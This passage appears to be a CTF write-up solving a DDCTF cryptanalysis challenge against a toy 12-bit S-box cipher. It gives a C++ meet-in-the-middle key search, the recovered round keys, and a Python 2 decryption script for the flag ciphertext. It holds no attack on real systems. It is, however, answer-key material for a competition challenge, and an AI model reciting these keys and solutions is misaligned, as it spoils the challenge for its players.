+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd>int</span> plain <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1079</span>;
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd>int</span> cipher <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>567</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> (<span style=color:#8be9fd>int</span> k0 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; k0 <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>4096</span>; k0<span style=color:#ff79c6>++</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> (<span style=color:#8be9fd>int</span> k1 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; k1 <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>4096</span>; k1<span style=color:#ff79c6>++</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#8be9fd>int</span> merge <span style=color:#ff79c6>=</span> merge_two(k0, k1);
+</span></span><span style=display:flex><span>            <span style=color:#8be9fd>int</span> mid <span style=color:#ff79c6>=</span> sbox1[sbox0[plain <span style=color:#ff79c6>^</span> k0] <span style=color:#ff79c6>^</span> k1];
+</span></span><span style=display:flex><span>            mid_status[mid].push_back(merge);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd>int</span> cnt <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> (<span style=color:#8be9fd>int</span> k2 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; k2 <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>4096</span>; k2<span style=color:#ff79c6>++</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> (<span style=color:#8be9fd>int</span> kf <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; kf <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>4096</span>; kf<span style=color:#ff79c6>++</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#8be9fd>int</span> mid <span style=color:#ff79c6>=</span> rol7(cipher);
+</span></span><span style=display:flex><span>            mid <span style=color:#ff79c6>=</span> mid <span style=color:#ff79c6>^</span> kf;
+</span></span><span style=display:flex><span>            mid <span style=color:#ff79c6>=</span> rsbox0[mid];
+</span></span><span style=display:flex><span>            mid <span style=color:#ff79c6>=</span> mid <span style=color:#ff79c6>^</span> k2;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> (<span style=color:#8be9fd>int</span> <span style=color:#ff79c6>&amp;</span><span style=color:#8be9fd;font-style:italic>tgt</span> : mid_status[mid]) {
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>auto</span> splited <span style=color:#ff79c6>=</span> split_two(tgt);
+</span></span><span style=display:flex><span>                <span style=color:#8be9fd>int</span> k0 <span style=color:#ff79c6>=</span> splited.first;
+</span></span><span style=display:flex><span>                <span style=color:#8be9fd>int</span> k1 <span style=color:#ff79c6>=</span> splited.second;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (encrypt_block_simple(<span style=color:#bd93f9>1079</span>, k0, k1, k2, kf) <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>567</span> <span style=color:#ff79c6>&amp;&amp;</span>
+</span></span><span style=display:flex><span>                    encrypt_block_simple(<span style=color:#bd93f9>633</span>, k0, k1, k2, kf) <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>361</span> <span style=color:#ff79c6>&amp;&amp;</span>
+</span></span><span style=display:flex><span>                        encrypt_block_simple(<span style=color:#bd93f9>1799</span>, k0, k1, k2, kf) <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>1793</span> <span style=color:#ff79c6>&amp;&amp;</span>
+</span></span><span style=display:flex><span>                        encrypt_block_simple(<span style=color:#bd93f9>1121</span>, k0, k1, k2, kf) <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>1001</span>) {
+</span></span><span style=display:flex><span>                    std<span style=color:#ff79c6>::</span>cout <span style=color:#ff79c6>&lt;&lt;</span> k0 <span style=color:#ff79c6>&lt;&lt;</span> <span style=color:#f1fa8c>&#34; &#34;</span> <span style=color:#ff79c6>&lt;&lt;</span> k1 <span style=color:#ff79c6>&lt;&lt;</span> <span style=color:#f1fa8c>&#34; &#34;</span> <span style=color:#ff79c6>&lt;&lt;</span> k2 <span style=color:#ff79c6>&lt;&lt;</span> <span style=color:#f1fa8c>&#34; &#34;</span> <span style=color:#ff79c6>&lt;&lt;</span> kf <span style=color:#ff79c6>&lt;&lt;</span> <span style=color:#f1fa8c>&#34; &#34;</span> <span style=color:#ff79c6>&lt;&lt;</span> std<span style=color:#ff79c6>::</span>endl;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>最后得到两个结果</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>3488 2863 726 1886
+</span></span><span style=display:flex><span>934 1050 1509 3200
+</span></span></code></pre></div><p>改下脚本用合并的轮密钥来解密，第一行那四个就是正确的密钥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6272a4># Define constant properties</span>
+</span></span><span style=display:flex><span>SECRET_KEYS <span style=color:#ff79c6>=</span> [<span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>0</span>]  <span style=color:#6272a4># DUMMY</span>
+</span></span><span style=display:flex><span>NUM_BITS <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>12</span>
+</span></span><span style=display:flex><span>BLOCK_SIZE_BITS <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>48</span>
+</span></span><span style=display:flex><span>BLOCK_SIZE <span style=color:#ff79c6>=</span> BLOCK_SIZE_BITS <span style=color:#ff79c6>/</span> <span style=color:#bd93f9>8</span>
+</span></span><span style=display:flex><span>MAX_VALUE <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>2</span> <span style=color:#ff79c6>&lt;&lt;</span> (NUM_BITS <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>))
+</span></span><span style=display:flex><span>BIT_MASK <span style=color:#ff79c6>=</span> MAX_VALUE <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>Cipher</span>(<span style=color:#8be9fd;font-style:italic>object</span>):
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> __init__(self, k0, k1, k2, kf):
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>k0 <span style=color:#ff79c6>=</span> k0
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>k1 <span style=color:#ff79c6>=</span> k1
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>k2 <span style=color:#ff79c6>=</span> k2
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>kf <span style=color:#ff79c6>=</span> kf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>_rand_start <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>sbox0, self<span style=color:#ff79c6>.</span>rsbox0 <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>generate_boxes(<span style=color:#bd93f9>106</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>sbox1, self<span style=color:#ff79c6>.</span>rsbox1 <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>generate_boxes(<span style=color:#bd93f9>81</span>)
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span> self<span style=color:#ff79c6>.</span>sbox0
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span> self<span style=color:#ff79c6>.</span>sbox1
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span> self<span style=color:#ff79c6>.</span>rsbox0
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span> self<span style=color:#ff79c6>.</span>rsbox1
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>my_srand</span>(self, seed):
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>_rand_start <span style=color:#ff79c6>=</span> seed
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>my_rand</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> self<span style=color:#ff79c6>.</span>_rand_start <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#ff79c6>.</span>_rand_start <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>123459876</span>
+</span></span><span style=display:flex><span>        hi <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>_rand_start <span style=color:#ff79c6>/</span> <span style=color:#bd93f9>127773</span>
+</span></span><span style=display:flex><span>        lo <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>_rand_start <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>127773</span>
+</span></span><span style=display:flex><span>        x <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>16807</span> <span style=color:#ff79c6>*</span> lo <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>2836</span> <span style=color:#ff79c6>*</span> hi
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> x <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>0</span>:
+</span></span><span style=display:flex><span>            x <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>0x7fffffff</span>
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>_rand_start <span style=color:#ff79c6>=</span> (x <span style=color:#ff79c6>%</span> (<span style=color:#bd93f9>0x7fffffff</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>))
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> self<span style=color:#ff79c6>.</span>_rand_start
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>generate_boxes</span>(self, seed):
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>my_srand(seed)
+</span></span><span style=display:flex><span>        sbox <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>range</span>(MAX_VALUE)
+</span></span><span style=display:flex><span>        rsbox <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>range</span>(MAX_VALUE)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> xrange(MAX_VALUE):
+</span></span><span style=display:flex><span>            r <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>my_rand() <span style=color:#ff79c6>%</span> MAX_VALUE
+</span></span><span style=display:flex><span>            temp <span style=color:#ff79c6>=</span> sbox[i]
+</span></span><span style=display:flex><span>            sbox[i] <span style=color:#ff79c6>=</span> sbox[r]
+</span></span><span style=display:flex><span>            sbox[r] <span style=color:#ff79c6>=</span> temp
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> xrange(MAX_VALUE):
+</span></span><span style=display:flex><span>            rsbox[sbox[i]] <span style=color:#ff79c6>=</span> i
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> sbox, rsbox
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>ror7</span>(self, b):
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> ((((b) <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>&gt;&gt;</span> <span style=color:#bd93f9>7</span>) <span style=color:#ff79c6>|</span> (((b) <span style=color:#ff79c6>&lt;&lt;</span> (NUM_BITS <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>7</span>)) <span style=color:#ff79c6>&amp;</span> BIT_MASK))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>rol7</span>(self, b):
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> ((((b) <span style=color:#ff79c6>&lt;&lt;</span> <span style=color:#bd93f9>7</span>) <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>|</span> (((b) <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>&gt;&gt;</span> (NUM_BITS <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>7</span>)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>pad_string</span>(self, s):
+</span></span><span style=display:flex><span>        num_blocks <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>len</span>(s) <span style=color:#ff79c6>/</span> BLOCK_SIZE
+</span></span><span style=display:flex><span>        num_remainder <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>len</span>(s) <span style=color:#ff79c6>%</span> BLOCK_SIZE
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        pad <span style=color:#ff79c6>=</span> (BLOCK_SIZE <span style=color:#ff79c6>-</span> num_remainder) <span style=color:#ff79c6>%</span> BLOCK_SIZE
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> xrange(BLOCK_SIZE <span style=color:#ff79c6>-</span> num_remainder):
+</span></span><span style=display:flex><span>            s <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(pad)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>unpad_string</span>(self, s):
+</span></span><span style=display:flex><span>        pad <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(s[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>]) <span style=color:#ff79c6>&amp;</span> <span style=color:#bd93f9>0xff</span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> pad <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0</span> <span style=color:#ff79c6>or</span> pad <span style=color:#ff79c6>&gt;</span> BLOCK_SIZE:
+</span></span><span style=display:flex><span>            pad <span style=color:#ff79c6>=</span> BLOCK_SIZE
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> s[:<span style=color:#ff79c6>-</span>pad]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>string_to_bits_list</span>(self, s):
+</span></span><span style=display:flex><span>        input_chars <span style=color:#ff79c6>=</span> s
+</span></span><span style=display:flex><span>        num_blocks <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>len</span>(s) <span style=color:#ff79c6>/</span> BLOCK_SIZE
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        bits_list <span style=color:#ff79c6>=</span> []
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> xrange(num_blocks):
+</span></span><span style=display:flex><span>            block <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> j <span style=color:#ff79c6>in</span> xrange(BLOCK_SIZE):
+</span></span><span style=display:flex><span>                block <span style=color:#ff79c6>=</span> block <span style=color:#ff79c6>&lt;&lt;</span> <span style=color:#bd93f9>8</span>
+</span></span><span style=display:flex><span>                block <span style=color:#ff79c6>=</span> block <span style=color:#ff79c6>|</span> <span style=color:#8be9fd;font-style:italic>ord</span>(input_chars[i <span style=color:#ff79c6>*</span> BLOCK_SIZE <span style=color:#ff79c6>+</span> j])
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> j <span style=color:#ff79c6>in</span> xrange(BLOCK_SIZE_BITS, <span style=color:#bd93f9>0</span>, <span style=color:#ff79c6>-</span>NUM_BITS):
+</span></span><span style=display:flex><span>                bits_list<span style=color:#ff79c6>.</span>append((block <span style=color:#ff79c6>&gt;&gt;</span> (j <span style=color:#ff79c6>-</span> NUM_BITS)) <span style=color:#ff79c6>&amp;</span> BIT_MASK)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> bits_list
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>bits_list_to_string</span>(self, input_bits):
+</span></span><span style=display:flex><span>        num_input_bits_per_block <span style=color:#ff79c6>=</span> BLOCK_SIZE_BITS <span style=color:#ff79c6>/</span> NUM_BITS;
+</span></span><span style=display:flex><span>        output_chars <span style=color:#ff79c6>=</span> []
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> xrange(<span style=color:#bd93f9>0</span>, <span style=color:#8be9fd;font-style:italic>len</span>(input_bits), num_input_bits_per_block):
+</span></span><span style=display:flex><span>            block <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> j <span style=color:#ff79c6>in</span> xrange(num_input_bits_per_block):
+</span></span><span style=display:flex><span>                block <span style=color:#ff79c6>=</span> block <span style=color:#ff79c6>&lt;&lt;</span> NUM_BITS
+</span></span><span style=display:flex><span>                block <span style=color:#ff79c6>=</span> block <span style=color:#ff79c6>|</span> (input_bits[i <span style=color:#ff79c6>+</span> j])
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> j <span style=color:#ff79c6>in</span> xrange(BLOCK_SIZE, <span style=color:#bd93f9>0</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>):
+</span></span><span style=display:flex><span>                output_chars<span style=color:#ff79c6>.</span>append((block <span style=color:#ff79c6>&gt;&gt;</span> ((j <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>8</span>)) <span style=color:#ff79c6>&amp;</span> <span style=color:#bd93f9>0xff</span>)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join([<span style=color:#8be9fd;font-style:italic>chr</span>(x) <span style=color:#ff79c6>for</span> x <span style=color:#ff79c6>in</span> output_chars])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>encrypt_bits</span>(self, b):
+</span></span><span style=display:flex><span>        boxed <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>sbox0[self<span style=color:#ff79c6>.</span>sbox1[self<span style=color:#ff79c6>.</span>sbox0[(b <span style=color:#ff79c6>&amp;</span> BIT_MASK) <span style=color:#ff79c6>^</span> self<span style=color:#ff79c6>.</span>k0] <span style=color:#ff79c6>^</span> self<span style=color:#ff79c6>.</span>k1] <span style=color:#ff79c6>^</span> self<span style=color:#ff79c6>.</span>k2] <span style=color:#ff79c6>^</span> self<span style=color:#ff79c6>.</span>kf
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> (self<span style=color:#ff79c6>.</span>ror7(boxed)) <span style=color:#ff79c6>&amp;</span> BIT_MASK;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>decrypt_bits</span>(self, b):
+</span></span><span style=display:flex><span>        unboxed <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>rol7((b <span style=color:#ff79c6>&amp;</span> BIT_MASK)) <span style=color:#ff79c6>^</span> self<span style=color:#ff79c6>.</span>kf
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> (self<span style=color:#ff79c6>.</span>rsbox0[self<span style=color:#ff79c6>.</span>rsbox1[self<span style=color:#ff79c6>.</span>rsbox0[unboxed] <span style=color:#ff79c6>^</span> self<span style=color:#ff79c6>.</span>k2] <span style=color:#ff79c6>^</span> self<span style=color:#ff79c6>.</span>k1] <span style=color:#ff79c6>^</span> self<span style=color:#ff79c6>.</span>k0);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>encrypt</span>(self, s):
+</span></span><span style=display:flex><span>        pad_s <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>pad_string(s)
+</span></span><span style=display:flex><span>        bits <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>string_to_bits_list(pad_s)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> self<span style=color:#ff79c6>.</span>bits_list_to_string([(self<span style=color:#ff79c6>.</span>encrypt_bits(b)) <span style=color:#ff79c6>for</span> b <span style=color:#ff79c6>in</span> bits])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>decrypt</span>(self, s):
+</span></span><span style=display:flex><span>        bits <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>string_to_bits_list(s)
+</span></span><span style=display:flex><span>        dec <span style=color:#ff79c6>=</span> [self<span style=color:#ff79c6>.</span>decrypt_bits(b) <span style=color:#ff79c6>for</span> b <span style=color:#ff79c6>in</span> bits]
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> self<span style=color:#ff79c6>.</span>unpad_string(self<span style=color:#ff79c6>.</span>bits_list_to_string(dec))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> __name__ <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    DIFFERENTECH Cipher
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    As you are monitoring your station, you intercepted a hex-encoded encrypted
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    message, along with its plain text.
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    plaintext = &#34;Cryptanalysis has coevolved together with cryptography&#34;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    ciphertext = (&#34;2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049&#34;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                  &#34;8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d&#34;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                  &#34;146146146146&#34;).decode(&#39;hex&#39;)
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    You have also previously chanced upon another encrypted message, which you
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    will need to decrypt.  Taking a look at the algorithm, and past interceptions,
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    you noticed that the 12-bit numbers:
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        2684 encrypts to 2568
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        3599 encrypts to 3185
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    You realize that you just might be able to break it before lunch!
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    NOTE: GIVE ONE ENCRYPTED FLAG AS PART OF THE QUESTIION AND Try to decrypt
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    &#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4># find the right SECRET_KEYS</span>
+</span></span><span style=display:flex><span>    SECRET_KEYS <span style=color:#ff79c6>=</span> [<span style=color:#bd93f9>3488</span>, <span style=color:#bd93f9>2863</span>, <span style=color:#bd93f9>726</span>, <span style=color:#bd93f9>1886</span>]
+</span></span><span style=display:flex><span>    cipher <span style=color:#ff79c6>=</span> Cipher(<span style=color:#ff79c6>*</span>SECRET_KEYS)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    test_text <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;DDCTF{&#34;</span>
+</span></span><span style=display:flex><span>    ciphertext <span style=color:#ff79c6>=</span> (<span style=color:#f1fa8c>&#34;8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf&#34;</span>)<span style=color:#ff79c6>.</span>decode(<span style=color:#f1fa8c>&#39;hex&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>#test_text = &#34;Cryptanalysis has coevolved together with cryptography&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>#ciphertext = (&#34;2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>#              &#34;8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>#              &#34;146146146146&#34;).decode(&#39;hex&#39;)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span> <span style=color:#f1fa8c>&#39;===&#39;</span>
+</span></span><span style=display:flex><span>    bits <span style=color:#ff79c6>=</span> cipher<span style=color:#ff79c6>.</span>string_to_bits_list(test_text)
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span> <span style=color:#8be9fd;font-style:italic>len</span>(bits)
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span> bits
+</span></span><span style=display:flex><span>    <span style=color:#6272a4># print cipher.encrypt_bits(1344)</span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4># print ciphertext</span>
+</span></span><span style=display:flex><span>    bits <span style=color:#ff79c6>=</span> cipher<span style=color:#ff79c6>.</span>string_to_bits_list(ciphertext)
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span> bits
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    dec <span style=color:#ff79c6>=</span> []
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> bits:
+</span></span><span style=display:flex><span>        dec<span style=color:#ff79c6>.</span>append(cipher<span style=color:#ff79c6>.</span>decrypt_bits(i))
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span> dec
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span> cipher<span style=color:#ff79c6>.</span>bits_list_to_string(dec)
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span> <span style=color:#8be9fd;font-style:italic>len</span>(bits)
+</span></span><span style=display:flex><span>    <span style=color:#6272a4># 8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#6272a4># enc = cipher.encrypt(test_text)</span>
+</span></span><span style=display:flex><span>    dec <span style=color:#ff79c6>=</span> cipher<span style=color:#ff79c6>.</span>decrypt(ciphertext)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> test_text <span style=color:#ff79c6>==</span> dec:
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;That&#39;s right!&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;Try again!&#34;</span>)
